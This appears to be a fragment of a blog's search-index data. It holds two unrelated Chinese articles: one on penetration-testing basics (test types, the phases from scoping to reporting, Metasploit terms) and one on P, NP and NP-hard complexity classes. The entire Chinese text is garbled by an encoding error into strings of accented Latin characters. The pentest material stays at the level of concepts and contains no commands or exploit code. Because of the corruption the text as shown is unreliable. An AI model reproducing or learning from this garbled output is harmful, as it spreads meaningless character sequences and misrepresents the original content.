ã€æ¶æ„è®¾è®¡æ–‡æ¡£ã€ç½‘ç»œæ‹“æ‰‘å›¾ã€æ•°æ®åº“ schemaã€APIæ¥å£æ–‡æ¡£ï¼Œç”šè‡³å¼€å‘å›¢é˜Ÿçš„ç›´æ¥æ²Ÿé€šã€‚ ä¿¡æ¯æ¥æºï¼š å®¢æˆ·æˆ–å¼€å‘å›¢é˜Ÿæä¾›çš„æ‰€æœ‰å†…éƒ¨èµ„æ–™ã€‚ ä¼˜ç‚¹ï¼š å…¨é¢æ·±å…¥ï¼š å¯ä»¥ç³»ç»Ÿæ€§åœ°å®¡æŸ¥æ‰€æœ‰ä»£ç è·¯å¾„ã€é…ç½®å’Œæ¥å£ï¼Œæ¼æ´å‘ç°ç‡æœ€é«˜ã€‚ æ•ˆç‡æé«˜ï¼š æ— éœ€çŒœæµ‹å’Œç›²ç›®æ¢æµ‹ï¼Œå¯ç›´æ¥å®šä½å¯èƒ½å­˜åœ¨é—®é¢˜çš„ä»£ç æ¨¡å—ã€‚ å‘ç°æ ¹æºé—®é¢˜ï¼š ä¸ä»…èƒ½æ‰¾åˆ°æ¼æ´ï¼Œè¿˜èƒ½ç²¾å‡†å®šä½æ¼æ´çš„ä»£ç è¡Œå’Œæ ¹æœ¬åŸå› ï¼Œä¾¿äºä¿®å¤ã€‚ æ—©æœŸä»‹å…¥ï¼š å¯ä»¥åœ¨å¼€å‘é˜¶æ®µï¼ˆå¦‚SASTï¼Œé™æ€åº”ç”¨å®‰å…¨æµ‹è¯•ï¼‰æˆ–ä¸Šçº¿å‰è¿›è¡Œã€‚ ç¼ºç‚¹ï¼š ä¸æ¨¡æ‹ŸçœŸå®æ”»å‡»ï¼š æ— æ³•è¯„ä¼°ç³»ç»Ÿåœ¨å¤–éƒ¨æ”»å‡»è€…è§†è§’ä¸‹çš„çœŸå®è¡¨ç°ã€‚ å¯èƒ½å¿½ç•¥é…ç½®æ¼æ´ï¼š è¿‡äºå…³æ³¨ä»£ç ï¼Œå¯èƒ½å¿½ç•¥è¿è¡Œæ—¶ç¯å¢ƒã€ç½‘ç»œé…ç½®ç­‰å¯¼è‡´çš„é—®é¢˜ã€‚ ä¾èµ–æµ‹è¯•äººå‘˜æŠ€æœ¯æ·±åº¦ï¼š éœ€è¦æµ‹è¯•äººå‘˜å…·å¤‡å¾ˆå¼ºçš„ä»£ç å®¡è®¡å’Œæ¶æ„ç†è§£èƒ½åŠ›ã€‚ é€‚ç”¨åœºæ™¯ï¼š ä»£ç å®‰å…¨å®¡è®¡ã€SDLï¼ˆå®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸï¼‰ä¸­çš„å®‰å…¨æµ‹è¯•ã€å†…éƒ¨å®‰å…¨è¯„ä¼°ã€å¯¹ç‰¹å®šå¤æ‚åº”ç”¨è¿›è¡Œæ·±åº¦æ£€æŸ¥ã€‚ ç°ç›’æµ‹è¯• æ¦‚å¿µï¼š ä»‹äºé»‘ç›’ä¸ç™½ç›’ä¹‹é—´ã€‚æµ‹è¯•äººå‘˜æ‹¥æœ‰éƒ¨åˆ†ã€æœ‰é™çš„å†…éƒ¨ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªä½æƒé™çš„ç”¨æˆ·è´¦å·ã€éƒ¨åˆ†APIæ–‡æ¡£ã€ç³»ç»Ÿä½¿ç”¨çš„æŠ€æœ¯æ¡†æ¶ä¿¡æ¯ï¼Œæˆ–è€…åŸºæœ¬çš„ç½‘ç»œæ¶æ„å›¾ã€‚ ä¿¡æ¯æ¥æºï¼š å®¢æˆ·æä¾›æœ‰é™ä¿¡æ¯ + æµ‹è¯•äººå‘˜è‡ªèº«ä¿¡æ¯æ”¶é›†ã€‚ ä¼˜ç‚¹ï¼š å¹³è¡¡æ•ˆç‡ä¸çœŸå®æ€§ï¼š åœ¨æ¨¡æ‹Ÿä¸€å®šçœŸå®æ”»å‡»çš„åŒæ—¶ï¼Œåˆ©ç”¨æœ‰é™ä¿¡æ¯æé«˜æµ‹è¯•çš„æ·±åº¦å’Œæ•ˆç‡ã€‚ èšç„¦ç‰¹æƒå‡çº§ï¼š éå¸¸é€‚åˆæµ‹è¯•ä»ä½æƒé™ç”¨æˆ·åˆ°é«˜æƒé™ï¼ˆå‚ç›´è¶Šæƒï¼‰æˆ–è·¨ç”¨æˆ·è®¿é—®ï¼ˆæ°´å¹³è¶Šæƒï¼‰çš„æ¼æ´ã€‚ è¯„ä¼°å†…éƒ¨å¨èƒï¼š æ¨¡æ‹Ÿå†…éƒ¨å‘˜å·¥æˆ–ä¾›åº”é“¾æ”»å‡»çš„åœºæ™¯ã€‚ ç¼ºç‚¹ï¼š èŒƒå›´éš¾ä»¥ç•Œå®šï¼š æä¾›å¤šå°‘ä¿¡æ¯ç®—â€œç°ç›’â€éœ€è¦ä¸å®¢æˆ·äº‹å…ˆæ¸…æ™°çº¦å®šã€‚ å¯èƒ½é—æ¼ä¸¤æ–¹é¢é—®é¢˜ï¼š æ—¢å¯èƒ½ä¸å¦‚ç™½ç›’å…¨é¢ï¼Œä¹Ÿå¯èƒ½ä¸å¦‚é»‘ç›’çœŸå®ã€‚ é€‚ç”¨åœºæ™¯ï¼š æœ€å¸¸è§çš„æ¸—é€æµ‹è¯•ç±»å‹ã€‚é€‚ç”¨äºå¤§å¤šæ•°éœ€è¦å¯¹å·²ä¸Šçº¿ç³»ç»Ÿè¿›è¡Œå†…éƒ¨å’Œå¤–éƒ¨ç»¼åˆè¯„ä¼°çš„é¡¹ç›®ï¼Œå¦‚Webåº”ç”¨æ¸—é€æµ‹è¯•ã€ç§»åŠ¨åº”ç”¨æµ‹è¯•ï¼ˆå·²çŸ¥éƒ¨åˆ†åç«¯APIï¼‰ã€‚ ç›®æ ‡åˆ†ç±» ä¸»æœºæ“ä½œç³»ç»Ÿæ¸—é€ â€‹\tå¦‚Windowsã€Solarisã€AIXã€Linuxã€SCOã€SGIç­‰æ“ä½œç³»ç»Ÿæœ¬èº«è¿›è¡Œæ¸—é€æµ‹è¯•\næ•°æ®åº“ç³»ç»Ÿæ¸—é€ â€‹\tå¯¹MS-SQLã€Oracleã€MySQLã€Informixã€Sybaseã€DB2ã€Accessç­‰æ•°æ®åº“åº”ç”¨ç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•\nåº”ç”¨ç³»ç»Ÿæ¸—é€ â€‹\tå¯¹æ¸—é€ç›®æ ‡æä¾›çš„å„ç§åº”ç”¨ï¼Œå¦‚ASPã€CGIã€JSPã€PHPç­‰ç»„æˆçš„WWWåº”ç”¨è¿›è¡Œæ¸—é€æµ‹è¯•\nç½‘ç»œè®¾å¤‡æ¸—é€ â€‹\tå¯¹å„ç§é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€ç½‘ç»œè®¾å¤‡è¿›è¡Œæ¸—é€æµ‹è¯•\næ¸—é€æµ‹è¯•è¿‡ç¨‹ç¯èŠ‚ å‰æœŸäº¤äº’é˜¶æ®µï¼ˆPre-Engagement Interactionï¼‰\næƒ…æŠ¥æœé›†é˜¶æ®µï¼ˆInformation Gatheringï¼‰\nå¨èƒå»ºæ¨¡é˜¶æ®µï¼ˆThreat Modelingï¼‰\næ¼æ´åˆ†æé˜¶æ®µï¼ˆVulnerability Analysisï¼‰\næ¸—é€æ”»å‡»é˜¶æ®µï¼ˆExploitationï¼‰\nåæ¸—é€æ”»å‡»é˜¶æ®µï¼ˆPost Exploitationï¼‰\næŠ¥å‘Šé˜¶æ®µï¼ˆReportingï¼‰\n1. å‰æœŸäº¤äº’é˜¶æ®µ æ­£å¼æµ‹è¯•å¼€å§‹å‰çš„è§„åˆ’å’Œçº¦å®šé˜¶æ®µï¼Œæ—¨åœ¨æ˜ç¡®æµ‹è¯•çš„èŒƒå›´ã€è§„åˆ™å’Œç›®æ ‡ï¼Œç¡®ä¿æµ‹è¯•åˆæ³•ã€æœ‰æ•ˆä¸”å¯æ§ã€‚\næ ¸å¿ƒæ´»åŠ¨ï¼š ç¡®å®šèŒƒå›´ï¼šä¸å®¢æˆ·å…±åŒå•†å®šå“ªäº›ç³»ç»Ÿã€ç½‘ç»œã€åº”ç”¨ç¨‹åºæˆ–IPåœ°å€å¯ä»¥æµ‹è¯•ï¼Œå“ªäº›æ˜¯ç»å¯¹ç¦æ­¢çš„ï¼ˆå¦‚ç”Ÿäº§æ•°æ®åº“ã€å®¢æˆ·æ•°æ®ç­‰ï¼‰ã€‚ ç¡®å®šè§„åˆ™ï¼šå®šä¹‰æµ‹è¯•æ–¹æ³•ï¼ˆé»‘ç›’ã€ç™½ç›’è¿˜æ˜¯ç°ç›’ï¼‰ã€æ”»å‡»å¼ºåº¦ï¼ˆæ˜¯å¦å…è®¸é€ æˆæœåŠ¡ä¸­æ–­ã€ç¤¾ä¼šå·¥ç¨‹æ”»å‡»ç­‰ï¼‰ã€æµ‹è¯•æ—¶é—´çª—å£ï¼ˆæ˜¯å¦åªèƒ½åœ¨éå·¥ä½œæ—¶é—´è¿›è¡Œï¼‰ã€‚ æ³•å¾‹æˆæƒï¼šç­¾ç½²æ¸—é€æµ‹è¯•æˆæƒä¹¦ï¼Œè¿™æ˜¯æœ€é‡è¦çš„æ³•å¾‹æ–‡ä»¶ï¼Œç¡®ä¿æµ‹è¯•è¡Œä¸ºåˆæ³•ï¼Œä¿æŠ¤æµ‹è¯•æ–¹å’Œå®¢æˆ·ã€‚ ç¡®å®šç›®æ ‡ï¼šæ˜ç¡®æµ‹è¯•çš„æœ€ç»ˆç›®çš„æ˜¯ä»€ä¹ˆï¼ˆå¦‚ï¼šéªŒè¯ç‰¹å®šé˜²ç«å¢™ç­–ç•¥ã€è¯„ä¼°æ–°ä¸Šçº¿çš„Webåº”ç”¨å®‰å…¨ã€æ»¡è¶³åˆè§„æ€§è¦æ±‚ç­‰ï¼‰ã€‚ è¾“å‡ºç‰©ï¼šæˆæƒä¹¦ã€èŒƒå›´å®šä¹‰æ–‡æ¡£ã€æ²Ÿé€šè®¡åˆ’ã€‚ 2. æƒ…æŠ¥æœé›†é˜¶æ®µ â€œä¿¡æ¯æ”¶é›†â€ï¼Œæ˜¯æµ‹è¯•çš„åŸºçŸ³ã€‚å°½å¯èƒ½å¤šåœ°æ”¶é›†å…³äºç›®æ ‡çš„å„ç§ä¿¡æ¯ï¼Œä¸ºåç»­æ”»å‡»å¯»æ‰¾å…¥å£ã€‚æƒ…æŠ¥åˆ†ä¸ºä¸¤ç±»ï¼š\nè¢«åŠ¨æƒ…æŠ¥æœé›†ï¼šåœ¨ä¸ä¸ç›®æ ‡ç³»ç»Ÿç›´æ¥äº¤äº’çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡å…¬å¼€æ¸ é“è·å–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šæœç´¢å¼•æ“ã€ç¤¾äº¤åª’ä½“ã€WhoisåŸŸåä¿¡æ¯ã€DNSè®°å½•ã€å…¬å¼€çš„ä»£ç ä»“åº“ã€æ–°é—»ç¨¿ç­‰ã€‚ ä¸»åŠ¨æƒ…æŠ¥æœé›†ï¼šé€šè¿‡ä¸ç›®æ ‡ç³»ç»Ÿç›´æ¥äº¤äº’æ¥è·å–ä¿¡æ¯ï¼Œä½†å¯èƒ½è¢«è®°å½•ã€‚ä¾‹å¦‚ï¼šç«¯å£æ‰«æã€æœåŠ¡æŒ‡çº¹è¯†åˆ«ã€ç½‘ç»œæ‹“æ‰‘æ¢æµ‹ç­‰ã€‚ å…³é”®ç›®æ ‡ï¼šå‘ç°ç›®æ ‡çš„æ‰€æœ‰ç½‘ç»œèµ„äº§ã€åŸŸåã€å­åŸŸåã€IPåœ°å€ã€å¼€æ”¾ç«¯å£ã€è¿è¡Œçš„æœåŠ¡ç‰ˆæœ¬ã€å‘˜å·¥ä¿¡æ¯ã€æŠ€æœ¯æ ˆç­‰ã€‚ 3. å¨èƒå»ºæ¨¡é˜¶æ®µ å¯¹æ”¶é›†åˆ°çš„ä¿¡æ¯è¿›è¡Œåˆ†æå’Œæç‚¼ï¼Œè¯†åˆ«å‡ºå¯èƒ½è¢«åˆ©ç”¨çš„èµ„äº§ã€æ½œåœ¨çš„å®‰å…¨æ¼æ´å’Œæ”»å‡»è·¯å¾„ã€‚è¿™æ˜¯ä¸€ä¸ªåˆ†æè§„åˆ’é˜¶æ®µã€‚\næ ¸å¿ƒæ´»åŠ¨ï¼š èµ„äº§è¯†åˆ«ï¼šæ¢³ç†å‡ºé«˜ä»·å€¼çš„æ”»å‡»ç›®æ ‡ï¼ˆå¦‚æ•°æ®åº“æœåŠ¡å™¨ã€æ–‡ä»¶æœåŠ¡å™¨ã€Webåº”ç”¨åå°ï¼‰ã€‚ æ”»å‡»é¢åˆ†æï¼šåˆ†æç›®æ ‡æš´éœ²çš„æ‰€æœ‰å¯èƒ½è¢«æ”»å‡»çš„ç‚¹ï¼ˆå¦‚å¼€æ”¾çš„è¿œç¨‹ç®¡ç†ç«¯å£ã€æœªè®¤è¯çš„Web APIã€è¿‡æ—¶çš„æ¡†æ¶ï¼‰ã€‚ æ”»å‡»å‘é‡è§„åˆ’ï¼šåŸºäºæƒ…æŠ¥ï¼Œæ„æ€å¯èƒ½çš„æ”»å‡»è·¯å¾„å’Œæ–¹æ³•ã€‚ä¾‹å¦‚ï¼šâ€œé€šè¿‡é’“é±¼é‚®ä»¶è·å–å‘˜å·¥å‡­è¯ -\u0026gt; ç™»å½•VPN -\u0026gt; åˆ©ç”¨å†…éƒ¨æ–‡ä»¶æœåŠ¡å™¨çš„æ¼æ´è·å–åŸŸæ§æƒé™â€ã€‚ å·¥å…·ä¸æŠ€æœ¯é€‰æ‹©ï¼šæ ¹æ®åˆ†æç»“æœï¼Œå‡†å¤‡ä¸‹ä¸€é˜¶æ®µæ‰€éœ€çš„æ¼æ´æ‰«æå·¥å…·ã€æ”»å‡»è½½è·ç­‰ã€‚ 4. æ¼æ´åˆ†æé˜¶æ®µ å¯¹å·²è¯†åˆ«çš„æ”»å‡»é¢è¿›è¡Œæ·±å…¥æ¢æµ‹ï¼Œä»¥å‘ç°å’ŒéªŒè¯å…·ä½“çš„å®‰å…¨æ¼æ´ã€‚\næ ¸å¿ƒæ´»åŠ¨ï¼š è‡ªåŠ¨åŒ–æ‰«æï¼šä½¿ç”¨Nessusã€Nexposeã€AWVSç­‰æ¼æ´æ‰«æå™¨è¿›è¡Œç³»ç»Ÿæ€§æ‰«æï¼Œç”Ÿæˆåˆæ­¥æ¼æ´æŠ¥å‘Šã€‚ æ‰‹åŠ¨éªŒè¯ä¸åˆ†æï¼šè¿™æ˜¯ä½“ç°æµ‹è¯•äººå‘˜æŠ€æœ¯çš„å…³é”®ã€‚å¯¹æ‰«æå™¨æŠ¥å‘Šçš„ç»“æœè¿›è¡Œå»è¯¯æŠ¥ã€åˆ†ææ¼æ´çš„å¯åˆ©ç”¨æ€§å’Œå®é™…é£é™©ç­‰çº§ã€‚æ‰«æå™¨æ‰¾ä¸åˆ°çš„é€»è¾‘æ¼æ´ã€ä¸šåŠ¡é€»è¾‘ç¼ºé™·ã€é…ç½®é”™è¯¯ç­‰ï¼Œéœ€è¦åœ¨æ­¤é˜¶æ®µé€šè¿‡æ‰‹åŠ¨æµ‹è¯•å‘ç°ã€‚ æ¼æ´ä¼˜å…ˆçº§æ’åºï¼šæ ¹æ®CVSSåˆ†æ•°ã€åˆ©ç”¨éš¾åº¦ã€å¯¹ä¸šåŠ¡çš„å½±å“ç­‰å› ç´ ï¼Œå¯¹æ¼æ´è¿›è¡Œæ’åºï¼Œå†³å®šåç»­æ”»å‡»çš„ä¼˜å…ˆçº§ã€‚ 5. æ¸—é€æ”»å‡»é˜¶æ®µ è¿™æ˜¯æ¨¡æ‹ŸçœŸå®æ”»å‡»è€…çš„æ ¸å¿ƒç¯èŠ‚ï¼Œå°è¯•åˆ©ç”¨å·²å‘ç°çš„æ¼æ´æ¥çªç ´å®‰å…¨é˜²çº¿ï¼Œè·å–å¯¹ç³»ç»Ÿæˆ–æ•°æ®çš„æœªæˆæƒè®¿é—®ã€‚\næ ¸å¿ƒæ´»åŠ¨ï¼š æ¼æ´åˆ©ç”¨ï¼šä½¿ç”¨Metasploitã€å®šåˆ¶åŒ–çš„EXPæˆ–æ‰‹åŠ¨æ”»å‡»æ–¹å¼ï¼Œåˆ©ç”¨æ¼æ´è·å–åˆå§‹è®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼šåˆ©ç”¨SQLæ³¨å…¥è·å–æ•°æ®åº“æ•°æ®ã€åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸Šä¼ Webshellã€åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´è·å–ç³»ç»ŸShellã€‚ çªç ´è¾¹ç•Œï¼šæˆåŠŸä»ä¸€ä¸ªå¤–éƒ¨ç‚¹ï¼ˆå¦‚WebæœåŠ¡å™¨ï¼‰æ”»å…¥å†…éƒ¨ç½‘ç»œã€‚ æƒé™æå‡ï¼šåœ¨å·²æ§åˆ¶çš„ä¸»æœºä¸Šï¼Œä»æ™®é€šç”¨æˆ·æƒé™æå‡ä¸ºç®¡ç†å‘˜/ç³»ç»Ÿæƒé™ã€‚ å…³é”®ç‚¹ï¼šæ­¤é˜¶æ®µéœ€è¦è°¨æ…æ“ä½œï¼Œé¿å…å¯¹ç›®æ ‡ç³»ç»Ÿé€ æˆæ„å¤–æŸå®³ã€‚ 6. åæ¸—é€æ”»å‡»é˜¶æ®µ åœ¨æˆåŠŸæ¸—é€è¿›å…¥ç›®æ ‡ç³»ç»Ÿåï¼Œæ¨¡æ‹Ÿé«˜çº§æŒç»­æ€§å¨èƒçš„æ”»å‡»è¡Œä¸ºï¼Œç›®æ ‡æ˜¯å±•ç¤ºæ¼æ´è¢«åˆ©ç”¨åå¯èƒ½é€ æˆçš„å®é™…ä¸šåŠ¡å½±å“ã€‚\næ ¸å¿ƒæ´»åŠ¨ï¼š æƒé™ç»´æŒï¼šåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åé—¨ã€åˆ›å»ºéšè—è´¦æˆ·ç­‰ï¼Œä»¥ç»´æŒé•¿æœŸæ§åˆ¶ã€‚ æ¨ªå‘ç§»åŠ¨ï¼šä»¥å·²æ§åˆ¶çš„æœºå™¨ä¸ºè·³æ¿ï¼Œæ¢æµ‹å’Œæ”»å‡»å†…ç½‘ä¸­çš„å…¶ä»–é‡è¦ä¸»æœºï¼ˆå¦‚æ•°æ®åº“æœåŠ¡å™¨ã€åŸŸæ§åˆ¶å™¨ï¼‰ã€‚ ç›®æ ‡è¾¾æˆï¼šçªƒå–æˆ–ç¯¡æ”¹æ•æ„Ÿæ•°æ®ï¼ˆåœ¨æˆæƒèŒƒå›´å†…ï¼‰ã€å®Œå…¨æ§åˆ¶æ ¸å¿ƒç³»ç»Ÿã€è®¿é—®å…³é”®ä¸šåŠ¡åŠŸèƒ½ç­‰ï¼Œä»¥è¯æ˜æ¼æ´çš„ä¸¥é‡æ€§ã€‚ è¶³è¿¹æ¸…ç†ï¼šæ ¹æ®æµ‹è¯•è§„åˆ™ï¼Œå¯èƒ½éœ€è¦æ¸…é™¤æµ‹è¯•è¿‡ç¨‹ä¸­ç•™ä¸‹çš„æ—¥å¿—ã€å·¥å…·ç­‰ç—•è¿¹ï¼ˆæ¨¡æ‹ŸçœŸå®æ”»å‡»è€…ï¼‰ï¼Œä¹Ÿå¯èƒ½ä¿ç•™ç”¨äºæŠ¥å‘Šè¯æ®ã€‚ 7. æŠ¥å‘Šé˜¶æ®µ å°†æ•´ä¸ªæµ‹è¯•è¿‡ç¨‹ã€å‘ç°ã€å½±å“å’Œå»ºè®®ä»¥æ¸…æ™°ã€ä¸“ä¸šçš„å½¢å¼å‘ˆç°ç»™å®¢æˆ·ï¼Œè¿™æ˜¯æ¸—é€æµ‹è¯•ä»·å€¼æœ€ç»ˆäº¤ä»˜çš„ä½“ç°ã€‚\næŠ¥å‘Šå†…å®¹ï¼š æ‰§è¡Œæ‘˜è¦ï¼šç”¨éæŠ€æœ¯è¯­è¨€å‘ç®¡ç†å±‚é˜è¿°æµ‹è¯•æ¦‚è¿°ã€å‘ç°çš„é«˜é£é™©é—®é¢˜åŠå…¶å¯¹ä¸šåŠ¡çš„æ½œåœ¨å½±å“ã€‚ æŠ€æœ¯ç»†èŠ‚ï¼šè¯¦ç»†æè¿°æ¯ä¸ªæ¼æ´çš„å‘ç°è¿‡ç¨‹ï¼ˆæ­¥éª¤ã€æˆªå›¾ï¼‰ã€åŸç†ã€å½±å“èŒƒå›´å’Œä¿®å¤å»ºè®®ã€‚è¿™éƒ¨åˆ†æ˜¯ç»™æŠ€æœ¯äººå‘˜çœ‹çš„ã€‚ é£é™©è¯„çº§ï¼šå¯¹æ¯ä¸ªæ¼æ´è¿›è¡Œä¸¥é‡ç¨‹åº¦è¯„çº§ï¼ˆå¦‚é«˜ã€ä¸­ã€ä½ï¼‰ã€‚ ä¿®å¤å»ºè®®ï¼šæä¾›å…·ä½“ã€å¯æ“ä½œçš„ä¿®å¤æ–¹æ¡ˆæˆ–ç¼“è§£æªæ–½ã€‚ é™„å½•ï¼šå¯èƒ½åŒ…å«å·¥å…·è¾“å‡ºã€æ—¥å¿—ç‰‡æ®µç­‰è¯æ®ææ–™ã€‚ æ¸—é€å®è·µ-Metasploitå¼€æºçš„æ¸—é€æµ‹è¯•æ¡†æ¶ Exploitï¼ˆæ¸—é€æ”»å‡»ï¼‰ï¼šæ¸—é€æ”»å‡»æ˜¯æŒ‡ç”±æ”»å‡»è€…æˆ–æ¸—é€æµ‹è¯•è€…åˆ©ç”¨ä¸€ä¸ªç³»ç»Ÿã€åº”ç”¨æˆ–æœåŠ¡ä¸­çš„å®‰å…¨æ¼æ´ï¼Œæ‰€è¿›è¡Œçš„æ”»å‡»è¡Œä¸ºã€‚æµè¡Œçš„æ¸—é€æ”»å‡»æŠ€æœ¯åŒ…æ‹¬ç¼“å†²åŒºæº¢å‡ºã€WEBåº”ç”¨ç¨‹åºæ¼æ´æ”»å‡»ï¼ˆSQLæ³¨å…¥ã€XSSç­‰ï¼‰ï¼Œä»¥åŠåˆ©ç”¨é…ç½®é”™è¯¯ç­‰ **Palyloadï¼ˆæ”»å‡»è½½è·ï¼‰**æ”»å‡»è½½è·æ˜¯æˆ‘ä»¬æœŸæœ›ç›®æ ‡ç³»ç»Ÿåœ¨è¢«æ¸—é€æ”»å‡»ä¹‹åæ‰§è¡Œçš„ä»£ç ã€‚åœ¨Metasploitæ¡†æ¶ä¸­å¯ä»¥è‡ªç”±é€‰æ‹©ã€ä¼ é€å’Œæ¤å…¥ ShellCodeï¼šSellCodeæ˜¯æ¸—é€æ”»å‡»æ—¶ä½œä¸ºæ”»å‡»è½½è·è¿è¡Œçš„ä¸€ç»„æœºå™¨æŒ‡ä»¤ï¼Œé€šå¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ Moduleï¼ˆæ¨¡å—ï¼‰ï¼šMetasploitä¸­ä¸€ä¸ªæ¨¡å—æ˜¯æŒ‡Metasploitæ¡†æ¶ä¸­æ‰€ä½¿ç”¨çš„ä¸€æ®µè½¯ä»¶ä»£ç ç»„ä»¶ Listenerï¼ˆç›‘å¬å™¨ï¼‰ï¼šç›‘å¬å™¨æ˜¯Metasploitä¸­ç”¨æ¥ç­‰å¾…æ¥å…¥ç½‘ç»œè¿æ¥ä¸»æœºçš„ç»„ä»¶ ","date":"2025-12-30T14:51:56+08:00","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/","title":"æ¸—é€æµ‹è¯•åŸºç¡€"},{"content":" ç›®å½• å‡ ç±»é—®é¢˜ Pç±»é—®é¢˜(polynomial) NPç±»é—®é¢˜ï¼ˆNondeterministic polynomialï¼‰ NPCé—®é¢˜ï¼ˆNPå®Œå…¨é—®é¢˜ï¼‰ NP-Hardé—®é¢˜ï¼ˆNPéš¾é—®é¢˜ï¼‰ å…³ç³»ä¸æ¯”è¾ƒ å½’çº¦æ€§ NPé—®é¢˜ä¸å½’çº¦ å‡ ç±»é—®é¢˜ Pç±»é—®é¢˜(polynomial) å®šä¹‰ï¼šå¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…è¢«ç¡®å®šæ€§å›¾çµæœºè§£å†³çš„é—®é¢˜ æ—¶é—´å¤æ‚åº¦ï¼šå¤šé¡¹å¼æ—¶é—´ï¼Œå¦‚ $ O(n) $ , $ O(n\\log n) $ , $ O(n^3 $ )ç­‰ç­‰ ç»å…¸é—®é¢˜ï¼šå°æ•°èƒŒåŒ…é—®é¢˜ã€æœç´¢ã€æ’åºã€Dijkstraã€AKSç®—æ³•ç­‰ NPç±»é—®é¢˜ï¼ˆNondeterministic polynomialï¼‰ å®šä¹‰ï¼šç»™å®šä¸€ä¸ªè¯ä¹¦ï¼ˆcertificationï¼‰ï¼Œå¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…éªŒè¯æ­¤è¯ä¹¦æ˜¯å¦æ˜¯é—®é¢˜çš„ä¸€ä¸ªè§£ã€‚åªä¿è¯åœ¨å¤šé¡¹å¼æ—¶é—´å†…èƒ½å¤ŸéªŒè¯è§£çš„å‡†ç¡®æ€§ï¼Œè€Œæ— æ³•ä¿è¯å¯è§£ã€‚ ä¾‹å¦‚ï¼šå“ˆå¯†é¡¿å›è·¯é—®é¢˜ã€TSPé—®é¢˜ã€SATé—®é¢˜ç­‰ Pç±»é—®é¢˜ä¸€å®šæ˜¯NPç±»é—®é¢˜ï¼ŒNPç±»é—®é¢˜ä¸ä¸€å®šæ˜¯Pç±»é—®é¢˜ NPCé—®é¢˜ï¼ˆNPå®Œå…¨é—®é¢˜ï¼‰ å®šä¹‰ï¼š æœ¬èº«æ˜¯NPé—®é¢˜ï¼ˆå¯å¿«é€ŸéªŒè¯è§£ï¼‰ æ‰€æœ‰çš„NPé—®é¢˜éƒ½å¯ä»¥è½¬æ¢æˆæ­¤é—®é¢˜ã€‚å³ï¼šæ‰€æœ‰çš„NPé—®é¢˜éƒ½å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…å½’çº¦ï¼ˆreducibilityï¼‰æˆæ­¤é—®é¢˜ ä¾‹å¦‚ï¼š3-SATã€é¡¶ç‚¹è¦†ç›–ã€å›¢é—®é¢˜ã€å­é›†å’Œé—®é¢˜ç­‰ å¯¹äºæœ€ä¼˜åŒ–çš„éªŒè¯é—®é¢˜ï¼ˆä¾‹å¦‚æ—…è¡Œå•†é—®é¢˜ï¼‰ï¼Œå¯ä»¥è½¬åŒ–ä¸ºä¸€ä¸ªåˆ¤æ–­é—®é¢˜ NP-Hardé—®é¢˜ï¼ˆNPéš¾é—®é¢˜ï¼‰ å®šä¹‰ï¼šè‡³å°‘å’ŒNPCé—®é¢˜ä¸€æ ·éš¾ï¼Œä½†ä¸ä¸€å®šå±äºNPé—®é¢˜ã€‚å³æ‰€æœ‰NPé—®é¢˜éƒ½èƒ½å½’çº¦åˆ°å®ƒï¼Œä½†å…¶æœ¬èº«ä¸ä¸€å®šæ˜¯NPé—®é¢˜ã€‚\nä¾‹å¦‚ï¼šTSPã€å›´æ£‹å¿…èƒœç­–ç•¥ã€åœæœºé—®é¢˜ç­‰\nå…³ç³»ä¸æ¯”è¾ƒ é—®é¢˜ç±»å‹ æ˜¯å¦å¿«é€Ÿæ±‚è§£ æ˜¯å¦å¿«é€ŸéªŒè¯ æ˜¯å¦æ‰€æœ‰NPå¯å½’çº¦ å…¸å‹ä¾‹å­ P âœ… âœ… âŒ æ’åº NP â“ï¼ˆæœªçŸ¥ï¼‰ âœ… âŒ TSPéªŒè¯ NPC â“ï¼ˆæœªçŸ¥ï¼‰ âœ… âœ… 3-SAT NPH âŒï¼ˆæ›´éš¾ï¼‰ âŒï¼ˆå¯èƒ½ï¼‰ âœ… TSPä¼˜åŒ– 1 2 3 4 5 6 7 8 9 10 11 graph TB subgraph NP-Hard direction TB subgraph NP direction TB subgraph NPC end subgraph P end end end å½’çº¦æ€§ ä¸€ä¸ªé—®é¢˜ï¼ˆ $ Q_1 $ ï¼‰å¯ä»¥å½’çº¦ä¸ºå¦å¤–ä¸€ä¸ªé—®é¢˜ï¼ˆ $ Q_2 $ ï¼‰ï¼š $ Q_1 $ å¯ä»¥è½¬æ¢ä¸º $ Q_2 $ ï¼Œä¹‹åå¯ä»¥é€šè¿‡æ±‚è§£ $ Q_2 $ çš„æ–¹æ³•æ¥æ±‚è§£ $ Q_1 $ ç®€å•çš„æ¯”å–»ï¼šæ±‚è§£ä¸€å…ƒä¸€æ¬¡æ–¹ç¨‹å¯å½’çº¦ä¸ºæ±‚è§£ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ï¼ˆäºŒæ¬¡é¡¹ç³»æ•°ä¸º0ï¼‰ å®šä¹‰ï¼šä¸€ä¸ªé—®é¢˜ï¼ˆ $ Q_1 $ ï¼‰å¯ä»¥å½’çº¦ä¸ºå¦å¤–ä¸€ä¸ªé—®é¢˜ï¼ˆ $ Q_2 $ ï¼‰éœ€æ»¡è¶³ï¼š å®ä¾‹å¯¹åº”æ€§ï¼š$ Q_1 $ å¾—ä»»æ„ä¸€ä¸ªå®ä¾‹ $ \\phi $ ï¼Œé€šè¿‡å‡½æ•° $ f $ éƒ½å¯è½¬åŒ–æˆ $ Q_2 $ çš„ä¸€ä¸ªå®ä¾‹ $ f(\\phi) $ ï¼Œä¸”è¿™ä¸ªè½¬åŒ–å‡½æ•° $ f $ 